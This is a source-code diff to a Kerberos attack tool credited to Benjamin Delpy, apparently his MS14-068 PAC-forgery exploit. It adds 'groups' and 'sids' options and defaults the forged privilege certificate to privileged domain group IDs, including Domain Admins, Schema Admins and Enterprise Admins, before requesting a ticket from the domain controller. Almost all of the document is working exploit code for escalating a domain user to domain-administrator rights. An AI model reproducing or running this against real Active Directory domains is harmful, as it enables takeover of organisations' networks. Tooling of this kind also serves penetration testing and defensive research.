@@ -32,12 +32,16 @@ BOOL term()
 	return !(g_isAsn1Init || g_isSockInit || g_isKerberos);
 }
 
+GROUP_MEMBERSHIP defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAULT_GROUP_ATTRIBUTES}, {520, DEFAULT_GROUP_ATTRIBUTES}, {518, DEFAULT_GROUP_ATTRIBUTES}, {519, DEFAULT_GROUP_ATTRIBUTES},};
 int main(int argc, char * argv[])
 {
 	EncryptionKey userKey;
-	LPCSTR szUser, szDomain, szTarget, szService, szPassword = NULL, szKey = NULL, szSid, szRid, szKdc = NULL, szFilename = NULL;
-	PSID sid = NULL, domainSid = NULL;
-	DWORD ret, rid = 0;
+	LPCSTR szUser, szDomain, szTarget, szService, szPassword = NULL, szKey = NULL, szSid, szRid, szKdc = NULL, szFilename = NULL, szGroups, szSids, base;
+	PSTR baseSid, tmpSid;
+	PSID sid = NULL, domainSid = NULL, pSidTmp;
+	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
+	PKERB_SID_AND_ATTRIBUTES sids = NULL;
+	DWORD ret, rid = 0, i, j, nbGroups, nbSids = 0;
 	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
 
 	kprintf("\n"
@@ -47,7 +51,7 @@ int main(int argc, char * argv[])
 		" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
 		" '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)\n"
 		"  '#####'    ...   with thanks to Tom Maddock & Sylvain Monne * * */\n\n");
-	
+
 	if(init())
 	{
 		if(!kull_m_string_args_byName(argc, argv, "ptt", NULL, NULL))
@@ -70,11 +74,79 @@ int main(int argc, char * argv[])
 							else
 								userKey.keytype = KERB_ETYPE_RC4_HMAC_NT;
 
+							if(kull_m_string_args_byName(argc, argv, "groups", &szGroups, NULL))
+							{
+								for(nbGroups = 0, base = szGroups; base && *base; )
+								{
+									if(strtoul(base, NULL, 0))
+										nbGroups++;
+									if(base = strchr(base, ','))
+										base++;
+								}
+								if(nbGroups && (dynGroups = (PGROUP_MEMBERSHIP) LocalAlloc(LPTR, nbGroups * sizeof(GROUP_MEMBERSHIP))))
+								{
+									for(i = 0, base = szGroups; (base && *base) && (i < nbGroups); )
+									{
+										if(j = strtoul(base, NULL, 0))
+										{
+											dynGroups[i].Attributes = DEFAULT_GROUP_ATTRIBUTES;
+											dynGroups[i].RelativeId = j;
+											i++;
+										}
+										if(base = strchr(base, ','))
+											base++;
+									}
+								}
+							}
+							if(nbGroups && dynGroups)
+								groups = dynGroups;
+							else
+							{
+								groups = defaultGroups;
+								nbGroups = ARRAYSIZE(defaultGroups);
+							}
+
+							if(kull_m_string_args_byName(argc, argv, "sids", &szSids, NULL))
+							{
+								if(tmpSid = _strdup(szSids))
+								{
+									for(nbSids = 0, base = tmpSid; base && *base; )
+									{
+										if(baseSid = strchr(base, ','))
+											*baseSid = L'\0';
+										if(ConvertStringSidToSid(base, (PSID *) &pSidTmp))
+										{
+											nbSids++;
+											LocalFree(pSidTmp);
+										}
+										if(base = baseSid)
+											base++;
+									}
+									free(tmpSid);
+								}
+								if(nbSids && (sids = (PKERB_SID_AND_ATTRIBUTES) LocalAlloc(LPTR, nbSids * sizeof(KERB_SID_AND_ATTRIBUTES))))
+								{
+									if(tmpSid = _strdup(szSids))
+									{
+										for(i = 0, base = tmpSid; (base && *base) && (i < nbSids); )
+										{
+											if(baseSid = strchr(base, ','))
+												*baseSid = L'\0';
+											if(ConvertStringSidToSid(base, (PSID *) &sids[i].Sid))
+												sids[i++].Attributes = DEFAULT_GROUP_ATTRIBUTES;
+											if(base = baseSid)
+												base++;
+										}
+										free(tmpSid);
+									}
+								}
+							}
+
 							if(NT_SUCCESS(kull_m_kerberos_asn1_helper_util_stringToKey(szUser, szDomain, szPassword, szKey, &userKey)))
 							{
 								if(!kull_m_string_args_byName(argc, argv, "kdc", &szKdc, NULL))
 								{
-									ret = DsGetDcName(NULL, szDomain, NULL, NULL, DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
+									ret = DsGetDcName(NULL, szDomain, NULL, NULL, DS_KDC_REQUIRED | DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
 									if(ret == ERROR_SUCCESS)
 									{
 										szKdc = cInfo->DomainControllerName + 2;
@@ -127,7 +199,7 @@ int main(int argc, char * argv[])
 										if(szKdc)
 										{
 											kprintf("kdc      : %s\n\n", szKdc);
-											makeInception(szUser, szDomain, sid, rid, szTarget, szService, &userKey, szKdc, 88, szFilename);
+											makeInception(szUser, szDomain, sid, rid, szTarget, szService, &userKey, groups, nbGroups, sids, nbSids, szKdc, 88, szFilename);
 										}
 										else PRINT_ERROR("No KDC at all\n");
 
@@ -158,7 +230,7 @@ int main(int argc, char * argv[])
 	return 0;
 }
 
-void makeInception(PCSTR user, PCSTR domain, PSID sid, DWORD rid, PCSTR target, PCSTR service, EncryptionKey *key, PCSTR kdc, WORD port, PCSTR filename)
+void makeInception(PCSTR user, PCSTR domain, PSID sid, DWORD rid, PCSTR target, PCSTR service, EncryptionKey *key, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, PCSTR kdc, WORD port, PCSTR filename)
 {
 	SOCKET connectSocket;
 	OssBuf AsReq, TgsReq;
@@ -176,7 +248,7 @@ void makeInception(PCSTR user, PCSTR domain, PSID sid, DWORD rid, PCSTR target, 
 				if(kull_m_kerberos_asn1_helper_build_EncKDCRepPart_from_Rep(AsRep, &encAsRepPart, key, EncASRepPart_PDU))
 				{
 					kprintf(" [level   2] Van Chase     (PAC TIME)\n");
-					if(kuhl_m_pac_giveMePac(user, sid, rid, &encAsRepPart->authtime, KERB_CHECKSUM_MD5, NULL, &pac))
+					if(kuhl_m_pac_giveMePac(user, sid, rid, groups, cbGroups, sids, cbSids, &encAsRepPart->authtime, KERB_CHECKSUM_MD5, NULL, &pac))
 					{
 						kprintf(" [level   3] The Hotel     (TGS-REQ)\n");
 						if(kull_m_kerberos_asn1_helper_build_KdcReq(user, domain, &encAsRepPart->key, service, target, NULL, FALSE, &AsRep->ticket, &pac, &TgsReq))
